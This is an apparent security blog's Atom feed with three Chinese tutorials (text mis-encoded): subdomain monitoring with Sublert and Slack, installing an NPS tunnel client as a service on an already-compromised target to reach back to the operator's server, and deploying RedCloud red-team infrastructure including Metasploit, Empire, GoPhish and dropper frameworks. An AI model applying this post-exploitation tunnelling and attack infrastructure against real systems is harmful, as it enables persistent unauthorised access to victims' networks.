<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>å¤œèº</title>
  
  <subtitle>å¤œèº</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-09-28T09:36:03.278Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>å¤œèº</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Slackè‡ªåŠ¨åŒ–å®Œæˆå­åŸŸåç›‘æ§</title>
    <link href="http://example.com/2020/10/27/Slack%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%8C%E6%88%90%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7/"/>
    <id>http://example.com/2020/10/27/Slack%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%8C%E6%88%90%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7/</id>
    <published>2020-10-27T07:05:13.000Z</published>
    <updated>2021-09-28T09:36:03.278Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Slackè‡ªåŠ¨åŒ–å®Œæˆå­åŸŸåç›‘æ§"><a href="#Slackè‡ªåŠ¨åŒ–å®Œæˆå­åŸŸåç›‘æ§" class="headerlink" title="Slackè‡ªåŠ¨åŒ–å®Œæˆå­åŸŸåç›‘æ§"></a>Slackè‡ªåŠ¨åŒ–å®Œæˆå­åŸŸåç›‘æ§</h1><p>[toc]</p><h2 id="0x01-ç¯å¢ƒå‡†å¤‡"><a href="#0x01-ç¯å¢ƒå‡†å¤‡" class="headerlink" title="0x01 ç¯å¢ƒå‡†å¤‡"></a>0x01 ç¯å¢ƒå‡†å¤‡</h2><ul><li>ubuntu 18.04</li><li>python3</li><li>å…è´¹çš„Slackç©ºé—´</li></ul><h2 id="0x02-Sublertæ­å»º"><a href="#0x02-Sublertæ­å»º" class="headerlink" title="0x02 Sublertæ­å»º"></a>0x02 Sublertæ­å»º</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/yassineaboukir/sublert.git</span><br><span class="line">cd sublert</span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure><h2 id="0x03-Slackä¸å·¥å…·é…ç½®"><a href="#0x03-Slackä¸å·¥å…·é…ç½®" class="headerlink" title="0x03 Slackä¸å·¥å…·é…ç½®"></a>0x03 Slackä¸å·¥å…·é…ç½®</h2><ol><li><p>åœ¨å®˜ç½‘<a href="https://slack.com/%E6%B3%A8%E5%86%8C%E5%85%8D%E8%B4%B9%E8%B4%A6%E6%88%B7%EF%BC%8C%E5%B9%B6%E5%88%9B%E5%BB%BA%E4%B8%A4%E4%B8%AAchannel%EF%BC%8C%E5%A6%82%E4%B8%8B%E6%89%80%E7%A4%BA%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%90%8E%E6%9C%9F%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7%E5%92%8C%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E6%B1%87%E6%80%BB">https://slack.com/æ³¨å†Œå…è´¹è´¦æˆ·ï¼Œå¹¶åˆ›å»ºä¸¤ä¸ªchannelï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œç”¨äºåæœŸçš„å­åŸŸåç›‘æ§å’Œé”™è¯¯ä¿¡æ¯æ±‡æ€»</a><br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/Py7kRq.png" alt="Py7kRq"></p></li><li><p>ä¸ºç¬¬ä¸€æ­¥åˆ›å»ºçš„Channelé…ç½®å¯¹åº”çš„webhook url<br>åœ¨ä»¥ä¸‹åœ°å€é…ç½®APP<br><a href="https://api.slack.com/apps">https://api.slack.com/apps</a><br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/XRhPEY.png" alt="XRhPEY"></p></li><li><p>ç‚¹å‡»Incoming Webhooks,åˆ›å»ºä¸¤ä¸ªWebhook<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/ISapdl.png" alt="ISapdl"><br>æŒ‡å‘ä¹‹å‰åˆ›å»ºçš„Channel<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/CI5vL4.png" alt="CI5vL4"></p></li><li><p>å¤åˆ¶ç¬¬ä¸‰æ­¥å¾—åˆ°çš„Webhook URlã€‚å¹¶é…ç½®åˆ°<code>config.py</code>ä¸­</p></li></ol><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/URX2eZ.png" alt="URX2eZ"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/x75EXi.png" alt="x75EXi"></p><ol start="5"><li>é…ç½®Crontab</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x</span><br><span class="line">crontab -e</span><br><span class="line">0 */12 * * * cd /root/sublert/ &amp;&amp; /usr/bin/python3 /root/sublert/sublert.py -r -l &gt;&gt; /var/log/sublert.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="0x04-ç»“è¯­"><a href="#0x04-ç»“è¯­" class="headerlink" title="0x04 ç»“è¯­"></a>0x04 ç»“è¯­</h2><p>å¤§ä½¬ä»¬å¯ä¿®æ”¹è„šæœ¬ï¼Œä½¿ä¹‹æ”¯æŒä¼ä¸šå¾®ä¿¡æˆ–è€…é’‰é’‰çš„Webhook</p><h2 id="0x05-å‚è€ƒé“¾æ¥"><a href="#0x05-å‚è€ƒé“¾æ¥" class="headerlink" title="0x05 å‚è€ƒé“¾æ¥"></a>0x05 å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://github.com/yassineaboukir/sublert">https://github.com/yassineaboukir/sublert</a></li><li><a href="https://medium.com/@yassineaboukir/automated-monitoring-of-subdomains-for-fun-and-profit-release-of-sublert-634cfc5d7708">https://medium.com/@yassineaboukir/automated-monitoring-of-subdomains-for-fun-and-profit-release-of-sublert-634cfc5d7708</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Slackè‡ªåŠ¨åŒ–å®Œæˆå­åŸŸåç›‘æ§&quot;&gt;&lt;a href=&quot;#Slackè‡ªåŠ¨åŒ–å®Œæˆå­åŸŸåç›‘æ§&quot; class=&quot;headerlink&quot; title=&quot;Slackè‡ªåŠ¨åŒ–å®Œæˆå­åŸŸåç›‘æ§&quot;&gt;&lt;/a&gt;Slackè‡ªåŠ¨åŒ–å®Œæˆå­åŸŸåç›‘æ§&lt;/h1&gt;&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="ç¥å…µåˆ©å™¨" scheme="http://example.com/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>NPSå¿«é€Ÿå®æˆ˜</title>
    <link href="http://example.com/2020/09/13/NPS%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <id>http://example.com/2020/09/13/NPS%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</id>
    <published>2020-09-13T06:49:22.000Z</published>
    <updated>2021-09-28T09:34:50.344Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NPSå¿«é€Ÿä½¿ç”¨æŠ€å·§"><a href="#NPSå¿«é€Ÿä½¿ç”¨æŠ€å·§" class="headerlink" title="NPSå¿«é€Ÿä½¿ç”¨æŠ€å·§"></a>NPSå¿«é€Ÿä½¿ç”¨æŠ€å·§</h1><h2 id="0x01-NPSæ­å»º"><a href="#0x01-NPSæ­å»º" class="headerlink" title="0x01 NPSæ­å»º"></a>0x01 NPSæ­å»º</h2><ol><li>ä»githubä¸‹è½½å®‰è£…åŒ…</li></ol><p><a href="https://github.com/ehang-io/nps/releases/">Releases Â· ehang-io/nps</a></p><ul><li>æ³¨ï¼šæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯æ˜¯å•ç‹¬åˆ†å¼€çš„ï¼ŒåŒæ—¶æ³¨æ„ç³»ç»Ÿæ¶æ„ç‰ˆæœ¬</li></ul><ol start="2"><li>æ„å»º</li></ol><p>ä¸‹è½½å®ŒæœåŠ¡å™¨å‹ç¼©åŒ…åï¼Œè§£å‹ï¼Œç„¶åè¿›å…¥è§£å‹åçš„æ–‡ä»¶å¤¹</p><ul><li>æ‰§è¡Œå®‰è£…å‘½ä»¤</li></ul><p>å¯¹äºlinux | darwinÂ <code>sudo ./nps install</code></p><p>å¯¹äºWindowsï¼Œç®¡ç†å‘˜èº«ä»½è¿è¡Œcmdï¼Œè¿›å…¥å®‰è£…ç›®å½•Â <code>nps.exe install</code></p><ul><li>å¯åŠ¨</li></ul><p>å¯¹äºlinux | darwinÂ <code>sudo nps start</code></p><p>å¯¹äºWindowsï¼Œç®¡ç†å‘˜èº«ä»½è¿è¡Œcmdï¼Œè¿›å…¥ç¨‹åºç›®å½•Â <code>nps.exe start</code></p><p><code>å®‰è£…åwindowsé…ç½®æ–‡ä»¶ä½äº C:\Program Files\npsï¼Œlinuxå’Œdarwinä½äº/etc/nps</code></p><p>åœæ­¢å’Œé‡å¯å¯ç”¨ï¼Œstopå’Œrestart</p><ul><li><p>Windowsæ—¥å¿—æ–‡ä»¶ä½äºå½“å‰è¿è¡Œç›®å½•ä¸‹ï¼Œlinuxå’Œdarwinä½äº/var/log/nps.log</p></li><li><p>è®¿é—®æœåŠ¡ç«¯ipï¼šwebæœåŠ¡ç«¯å£ï¼ˆé»˜è®¤ä¸º8080ï¼‰</p></li><li><p>ä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç ç™»é™†ï¼ˆé»˜è®¤ç®¡ç†å‘˜/ 123ï¼Œæ­£å¼ä½¿ç”¨ä¸€å®šè¦æ›´æ”¹ï¼‰</p></li><li><p>åˆ›å»ºå®¢æˆ·ç«¯</p></li></ul><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200913143322688.png" alt="image-20200913143322688"></p><h2 id="0x02-NPSå¿«é€Ÿå®æˆ˜"><a href="#0x02-NPSå¿«é€Ÿå®æˆ˜" class="headerlink" title="0x02 NPSå¿«é€Ÿå®æˆ˜"></a>0x02 NPSå¿«é€Ÿå®æˆ˜</h2><ol><li>é’ˆå¯¹å·²è·å–ç›®æ ‡æœºå™¨æƒé™ï¼Œæ ¹æ®ä¸åŒç³»ç»Ÿæ¶æ„åœ¨githubä¸Šé€‰æ‹©å¯¹åº”ç‰ˆæœ¬ä¸‹è½½ï¼Œä¹‹ååœ¨æ§åˆ¶å°é¡µé¢æ–°å¢å®¢æˆ·ç«¯</li></ol><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/Untitled%201.png" alt="NPS%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%2095da338c5f494aa4b285abf505283193/Untitled%201.png"></p><ul><li>å¯æ ¹æ®éœ€æ±‚é€‰æ‹©è‡ªå®šä¹‰ç”Ÿæˆå¯†é’¥ï¼Œé»˜è®¤ä¼šè‡ªåŠ¨éšæœºç”Ÿæˆå¯†é’¥ï¼Œè‡³äºBasic401è®¤è¯ä»…é™äºsocks5ã€webã€httpç­‰ç‰¹æ®Šéš§é“é€‰æ‹©ã€‚</li></ul><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/Untitled%202.png" alt="NPS%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%2095da338c5f494aa4b285abf505283193/Untitled%202.png"></p><p>æ–°å¢æˆåŠŸåï¼Œç‚¹å‡»å‰é¢çš„+å·å¯å¿«é€Ÿç”Ÿæˆå®¢æˆ·ç«¯å®‰è£…å‘½ä»¤ï¼Œå¸¸è§„å‘½ä»¤æ ¼å¼ï¼š</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">./npc -server=NPS_IP:NPS_PORT -vkey=vkey -type=tcp(udp)</span><br></pre></td></tr></table></figure><p>æ ¹æ®ç›®æ ‡ç³»ç»Ÿï¼Œé€‰æ‹©ä¸åŒå®‰è£…æ–¹å¼,å‘½ä»¤æ ¼å¼å¦‚ä¸Šï¼Œå¯¹äºæ³¨å†Œåˆ°ç³»ç»ŸæœåŠ¡çš„ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p><p>WIndows:</p><ul><li><p>éœ€è¦ç®¡ç†å‘˜è¿è¡ŒCMD</p></li><li><p>æ³¨å†Œï¼š<code>npc.exe install å…¶ä»–å‚æ•°ï¼ˆä¾‹å¦‚-server=xx -vkey=xxæˆ–è€…-config=xxxï¼‰</code></p></li><li><p>å¯åŠ¨ï¼š<code>npc.exe start</code></p></li><li><p>åœæ­¢ï¼š<code>npc.exe stop</code></p></li><li><p>å¦‚æœéœ€è¦æ›´æ¢å‘½ä»¤å†…å®¹éœ€è¦å…ˆå¸è½½<code>npc.exe uninstall</code></p><p>ï¼Œå†é‡æ–°æ³¨å†Œ</p></li><li><p>å¦‚æœéœ€è¦å½“å®¢æˆ·ç«¯é€€å‡ºæ—¶è‡ªåŠ¨é‡å¯å®¢æˆ·ç«¯ï¼Œè¯·æŒ‰ç…§å¦‚ä¸‹æ‰€ç¤ºé…ç½®</p></li></ul><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/Untitled%203.png" alt="NPS%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%2095da338c5f494aa4b285abf505283193/Untitled%203.png"></p><p>Liunx:</p><ul><li>æ³¨å†Œï¼š<code>sudo ./npc install å…¶ä»–å‚æ•°ï¼ˆä¾‹å¦‚-server=xx -vkey=xxæˆ–è€…-config=xxxï¼‰</code></li><li>å¯åŠ¨ï¼š<code>sudo npc start</code></li><li>åœæ­¢ï¼š<code>sudo npc stop</code></li><li>å¦‚æœéœ€è¦æ›´æ¢å‘½ä»¤å†…å®¹éœ€è¦å…ˆå¸è½½<code>./npc uninstall</code>ï¼Œå†é‡æ–°æ³¨å†Œ</li><li>inuxå’Œdarwinæ—¥å¿—ä½äº/var/log/npc.log</li></ul><p>ä»¥ä¸Šæ“ä½œæ— è¯¯çš„è¯ï¼Œwebæ§åˆ¶å°åº”è¯¥å®¢æˆ·ç«¯çŠ¶æ€åº”è¯¥æ˜¾ç¤ºåœ¨çº¿äº†ï¼Œè¿™é‡Œæµ‹è¯•ï¼Œæ•…ä¸ºç¦»çº¿ï¼Œä¹‹åçš„ä½¿ç”¨æ–¹æ³•å°±ç®€å•äº†</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/Untitled%204.png" alt="NPS%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%2095da338c5f494aa4b285abf505283193/Untitled%204.png"></p><p>ç‚¹å‡»å®¢æˆ·ç«¯å³è¾¹çš„éš§é“-æ–°å¢éš§é“</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/Untitled%205.png"></p><p>æ ¹æ®éœ€æ±‚é€‰æ‹©éš§é“ç±»å‹ï¼š</p><ul><li>TCPéš§é“</li><li>HTTPä»£ç†</li><li>UDPéš§é“</li><li>Socks5ä»£ç†</li><li>ç§å¯†ä»£ç†</li><li>P2Pè¿æ¥</li></ul><p>å…¶ä»–å‚æ•°æ ¹æ®éœ€æ±‚ï¼Œä¾‹å¦‚ä»£ç†è®¿é—®çš„ç›®æ ‡</p><h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><p>å¯¹äºNPSåœ¨å®æˆ˜ä¸­çš„ä½¿ç”¨å°±å†™åˆ°è¿™é‡Œï¼Œæ›´å¤šçš„æŠ€å·§æœ‰å¾…å„ä½å¸ˆå‚…å»æ‘¸ç´¢ã€‚</p><h2 id="0x04-å‚è€ƒé“¾æ¥"><a href="#0x04-å‚è€ƒé“¾æ¥" class="headerlink" title="0x04 å‚è€ƒé“¾æ¥"></a>0x04 å‚è€ƒé“¾æ¥</h2><p><a href="https://ehang-io.github.io/nps/#/">Document</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NPSå¿«é€Ÿä½¿ç”¨æŠ€å·§&quot;&gt;&lt;a href=&quot;#NPSå¿«é€Ÿä½¿ç”¨æŠ€å·§&quot; class=&quot;headerlink&quot; title=&quot;NPSå¿«é€Ÿä½¿ç”¨æŠ€å·§&quot;&gt;&lt;/a&gt;NPSå¿«é€Ÿä½¿ç”¨æŠ€å·§&lt;/h1&gt;&lt;h2 id=&quot;0x01-NPSæ­å»º&quot;&gt;&lt;a href=&quot;#0x01-NPSæ­å»º&quot; cla</summary>
      
    
    
    
    <category term="RedTeam" scheme="http://example.com/categories/RedTeam/"/>
    
    
    <category term="Redteam" scheme="http://example.com/tags/Redteam/"/>
    
  </entry>
  
  <entry>
    <title>çº¢é˜ŸåŸºç¡€è®¾æ–½æ­å»º-RedCloud</title>
    <link href="http://example.com/2020/08/16/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA-RedCloud/"/>
    <id>http://example.com/2020/08/16/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA-RedCloud/</id>
    <published>2020-08-16T08:30:47.000Z</published>
    <updated>2021-09-28T09:44:12.501Z</updated>
    
    <content type="html"><![CDATA[<p>##0x01 å¼•å­</p><blockquote><p>åœ¨çº¢é˜Ÿè¡ŒåŠ¨ä¸­ï¼Œä¸ºäº†åŒ¿åå’Œä¾¿æºæ€§ï¼Œç»å¸¸ä¼šé‡å¤æ€§çš„å»ºè®¾åŸºç¡€è®¾æ–½ï¼Œå¦‚C2ã€é’“é±¼ã€ä»£ç†å¹³å°ç­‰ç­‰ï¼Œè¿™æ ·ä¼šæµªè´¹å¤§é‡çš„ç²¾åŠ›å’Œæ—¶é—´ï¼Œå¦‚ä½•å»å¿«é€Ÿéƒ¨ç½²è¿ç§»è¿™äº›åŸºç¡€è®¾æ–½å‘¢ï¼Ÿæœ€è¿‘çœ‹åˆ°ä¸€ä¸ªæŒºä¸é”™çš„é¡¹ç›®ï¼Œéå¸¸é€‚åˆçº¢é˜Ÿå¿«é€Ÿéƒ¨ç½²è®¾æ–½ã€‚</p></blockquote><h2 id="0x02-ç®€ä»‹"><a href="#0x02-ç®€ä»‹" class="headerlink" title="0x02 ç®€ä»‹"></a>0x02 ç®€ä»‹</h2><blockquote><p>RedCloudæ˜¯ä¸€æ¬¾å¼ºå¤§çš„å·¥å…·ç®±ï¼Œä½¿ç”¨Dockerå¿«é€Ÿéƒ¨ç½²çº¢é˜Ÿè®¾æ–½ï¼Œèƒ½å¤Ÿåœ¨å‡ åˆ†é’Ÿå†…å¿«é€Ÿéƒ¨ç½²å¦‚Kaliã€Metasploitã€Gofishç­‰åŸºç¡€è®¾æ–½ï¼Œå¹¶ä¸”é€šè¿‡Webç•Œé¢ç®¡ç†å®¹å™¨ã€‚</p></blockquote><p><a href="https://github.com/khast3x/Redcloud">RedCloud-Githubä¼ é€é—¨</a></p><p>RedCloudæ–‡ä»¶æ¶æ„ï¼š</p><ul><li><code>RedCloud.py</code>:ä½¿ç”¨Dockerå’ŒPortainerå¯åŠ¨/åœæ­¢Webç•Œé¢å’Œåº”ç”¨æ¨¡æ¿</li><li><code>Portainer</code>:Portainer Webç•Œé¢</li><li><code>traefik</code>:Traefikåå‘ä»£ç†å®¹å™¨åˆ°Webç•Œé¢ï¼Œapiå’Œæ–‡ä»¶å®¹å™¨</li><li><code>templates</code> :http.serveræä¾›åŸºç¡€è®¾æ–½çš„python3 å®¹å™¨</li><li><code>cert_gen</code>ï¼šç”ŸæˆSSLè¯ä¹¦çš„<a href="https://github.com/paulczar/omgwtfssl">omgwtfssl</a>å®¹å™¨ã€‚</li></ul><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/uaUYJa.png" alt="uaUYJa"></p><p>ç›¸å…³URLï¼š</p><ul><li><a href="https://your-server-ip/portainer">https:/your-server-ip /</a> portainer : RedCloud webç•Œé¢</li><li><a href="https://your-server-ip/files">https:// your-server-ip / files</a>:Redcloud <code>redcloud_files</code>æ–‡ä»¶å·ã€‚é»˜è®¤å¯†ç ï¼šadmin/Redcloud</li><li><a href="https://your-server-ip/api">https// your-server-ip / api</a>ï¼šTraefikåå‘ä»£ç†è¿è¡ŒçŠ¶å†µç›‘è§†é¡µé¢ã€‚æ˜¾ç¤ºæœ‰å…³è·¯ç”±ï¼Œåç«¯ï¼Œè¿”å›ç çš„å®æ—¶ç»Ÿè®¡ä¿¡æ¯ã€‚</li></ul><h2 id="0x03-ç¯å¢ƒä¿¡æ¯"><a href="#0x03-ç¯å¢ƒä¿¡æ¯" class="headerlink" title="0x03 ç¯å¢ƒä¿¡æ¯"></a>0x03 ç¯å¢ƒä¿¡æ¯</h2><p>Centos 7</p><p>1æ ¸1Gï¼ˆç©·ğŸ¶ä¹°ä¸èµ·æœåŠ¡å™¨ï¼‰</p><p>æ­¤é…ç½®ä»…ä¸ºæµ‹è¯•ï¼Œå®æˆ˜è¿˜æ˜¯éœ€è¦è¾ƒé«˜é…ç½®æ¥æ­å»ºRedCloudã€‚</p><h2 id="0x04å®‰è£…éƒ¨ç½²"><a href="#0x04å®‰è£…éƒ¨ç½²" class="headerlink" title="0x04å®‰è£…éƒ¨ç½²"></a>0x04å®‰è£…éƒ¨ç½²</h2><ol><li>ä¸‹è½½æ‹‰å–RedCloudå­˜å‚¨åº“</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/khast3x/Redcloud.git</span><br></pre></td></tr></table></figure><ol start="2"><li>å¯åŠ¨    <code>redcloud.py</code></li></ol><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/tu1Ea3.png" alt="tu1Ea3"></p><p>ç›¸å…³é€‰é¡¹å¦‚ä¸‹ï¼š</p><ul><li>åœ¨æœ¬åœ°æœºå™¨éƒ¨ç½²<code>RedCloud</code></li><li>é€šè¿‡SSHè¿œç¨‹éƒ¨ç½²<code>RedCloud</code></li><li>è¿œç¨‹éƒ¨ç½²Docker RedCloud</li><li>åœæ­¢æœ¬åœ°åº”ç”¨æˆ–è€…dockeræœºå™¨</li><li>åœæ­¢è¿œç¨‹éƒ¨ç½²</li><li>åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„æ¨¡æ¿</li></ul><hr><p>æ‰€æœ‰æ¨¡æ¿</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&gt;] Metasploit - Nightly : Official bare Metasploit Alpine build. Includes beta features from dev branch.</span><br><span class="line"></span><br><span class="line">[&gt;] Metasploit - Stable + Postgresql : Debian Metasploit build with Postgres and additional helper scripts</span><br><span class="line"></span><br><span class="line">[&gt;] Empire : Pure Python &amp; PowerShell post-exploitation</span><br><span class="line"></span><br><span class="line">[&gt;] Sn1per : Automated pentest framework for offensive security experts</span><br><span class="line"></span><br><span class="line">[&gt;] Metasploithelper : MetasploitHelper is meant to assist penetration testers in network penetration tests. Comes with everything installed</span><br><span class="line"></span><br><span class="line">[&gt;] Pentest-tools : Ubuntu build with: searchsploit, sqlmap, nmap, nikto, dnsutils, sn1per, knock, sqliv, pasko, uniscan, wpscan, ncrack, wfuzz, sublist3r, massdns</span><br><span class="line"></span><br><span class="line">[&gt;] Kali - Bare : Official Kali container. Install desired metapackages</span><br><span class="line"></span><br><span class="line">[&gt;] Kali - Full : Non-Official Kali container with kali-linux-full metapackage installed, built every night</span><br><span class="line"></span><br><span class="line">[&gt;] Tor Socks Proxy : The smallest (15 MB) docker image with Tor and Privoxy on Alpine Linux</span><br><span class="line"></span><br><span class="line">[&gt;] Multi Tor Socks Proxy : A multi TOR (x10) + privoxy socks proxy instances load-balancer </span><br><span class="line"></span><br><span class="line">[&gt;] GoPhish : Open-Source Phishing Toolkit</span><br><span class="line"></span><br><span class="line">[&gt;] gscript : Framework to rapidly implement custom droppers for all three major operating systems</span><br><span class="line"></span><br><span class="line">[&gt;] Spiderfoot : SpiderFoot automates OSINT to find out everything possible about your target.</span><br><span class="line"></span><br><span class="line">[&gt;] ZAP Proxy WebSwing : Official in-browser version of ZAP.</span><br><span class="line"></span><br><span class="line">[&gt;] Ubuntu Web VNC : Docker container images with VNC and http NoVNC</span><br><span class="line"></span><br><span class="line">[&gt;] Kali Web noVNC + LXDE : Kali Docker container with minimal LXDE</span><br><span class="line"></span><br><span class="line">[&gt;] Lockdoor Framework : Lockdoor Framework : A Penetration Testing framework with Cyber Security Resources</span><br><span class="line"></span><br><span class="line">[&gt;] DVWA : Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable</span><br><span class="line"></span><br><span class="line">[&gt;] JuiceShop : OWASP Juice Shop is an intentionally insecure web application written entirely in JavaScript which encompasses the entire range of OWASP Top Ten and other severe security flaws.</span><br><span class="line"></span><br><span class="line">[&gt;] Vulnerable Wordpress : Vulnerable WordPress Installation</span><br><span class="line"></span><br><span class="line">[&gt;] Vulnerable Shellshock : Vulnerable Shellshock Installation - CVE-2014-6271</span><br><span class="line"></span><br><span class="line">[&gt;] Vulnerable SambaCry : Vulnerable Samba Installation - CVE-2017-7494</span><br><span class="line"></span><br><span class="line">[&gt;] OWASP Mutillidae II : Docker container for OWASP Mutillidae II Web Pen-Test Practice Application</span><br><span class="line"></span><br><span class="line">[&gt;] Network Utilities : A lightweight docker container with a set of networking tools&lt;br&gt;Use /bin/sh</span><br><span class="line"></span><br><span class="line">[&gt;] SoftEtherVPN : A simple SoftEther VPN server</span><br><span class="line"></span><br><span class="line">[&gt;] Cowrie Honeypot : SSH Honeypot that logs authentication attempts and interactions</span><br><span class="line"></span><br><span class="line">[&gt;] Endlessh tarpit : SSH tarpit that slowly sends an endless banner</span><br><span class="line"></span><br><span class="line">[&gt;] Beagle : Incident response and digital forensics tool which transforms data sources and logs into graphs. Supported data sources include FireEye HX Triages, Windows EVTX files, SysMon logs and Raw Windows memory images.</span><br><span class="line"></span><br><span class="line">[&gt;] Nginx : High performance web server</span><br><span class="line"></span><br><span class="line">[&gt;] Httpd : Open-source HTTP server</span><br><span class="line"></span><br><span class="line">[&gt;] Caddy : HTTP/2 web server with automatic HTTPS</span><br><span class="line"></span><br><span class="line">[&gt;] MySQL : The most popular open-source database</span><br><span class="line"></span><br><span class="line">[&gt;] PostgreSQL : The most advanced open-source database</span><br><span class="line"></span><br><span class="line">[&gt;] Elasticsearch : Open-source search and analytics engine</span><br><span class="line"></span><br><span class="line">[&gt;] Gitlab CE : Open-source end-to-end software development platform</span><br><span class="line"></span><br><span class="line">[&gt;] Minio : A distributed object storage server built for cloud applications and devops</span><br><span class="line"></span><br><span class="line">[&gt;] Solr : Open-source enterprise search platform</span><br><span class="line"></span><br><span class="line">[&gt;] Joomla : Another free and open-source CMS</span><br><span class="line"></span><br><span class="line">[&gt;] Drupal : Open-source content management framework</span><br><span class="line"></span><br><span class="line">[&gt;] Odoo : Open-source business apps</span><br><span class="line"></span><br><span class="line">[&gt;] Urbackup : Open-source network backup</span><br><span class="line"></span><br><span class="line">[&gt;] Portainer Agent : Manage all the resources in your Swarm cluster</span><br><span class="line"></span><br><span class="line">[&gt;] Wordpress : Wordpress setup with a MySQL database</span><br></pre></td></tr></table></figure><h2 id="0x05-å®‰è£…æˆåŠŸ"><a href="#0x05-å®‰è£…æˆåŠŸ" class="headerlink" title="0x05 å®‰è£…æˆåŠŸ"></a>0x05 å®‰è£…æˆåŠŸ</h2><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/1urfxo.png" alt="1urfxo"></p><p>åç»­åªéœ€è¦é€‰æ‹©è‡ªå·±æ‰€éœ€è¦çš„çº¢é˜Ÿè®¾æ–½éƒ¨ç½²å°±è¡Œï¼Œå¯åŠ¨å¯¹åº”çš„å®¹å™¨å³å¯ã€‚åç»­è¿˜æœ‰æ–°åŠŸèƒ½è¯·è‡ªè¡Œæ‘¸ç´¢â€¦â€¦é¸½äº†å’•å’•å’•å’•</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;##0x01 å¼•å­&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åœ¨çº¢é˜Ÿè¡ŒåŠ¨ä¸­ï¼Œä¸ºäº†åŒ¿åå’Œä¾¿æºæ€§ï¼Œç»å¸¸ä¼šé‡å¤æ€§çš„å»ºè®¾åŸºç¡€è®¾æ–½ï¼Œå¦‚C2ã€é’“é±¼ã€ä»£ç†å¹³å°ç­‰ç­‰ï¼Œè¿™æ ·ä¼šæµªè´¹å¤§é‡çš„ç²¾åŠ›å’Œæ—¶é—´ï¼Œå¦‚ä½•å»å¿«é€Ÿéƒ¨ç½²è¿ç§»è¿™äº›åŸºç¡€è®¾æ–½å‘¢ï¼Ÿæœ€è¿‘çœ‹åˆ°ä¸€ä¸ªæŒºä¸é”™çš„é¡¹ç›®ï¼Œéå¸¸é€‚åˆçº¢é˜Ÿå¿«é€Ÿéƒ¨ç½²è®¾æ–½ã€‚&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="RedTeam" scheme="http://example.com/categories/RedTeam/"/>
    
    
    <category term="Redteam" scheme="http://example.com/tags/Redteam/"/>
    
  </entry>
  
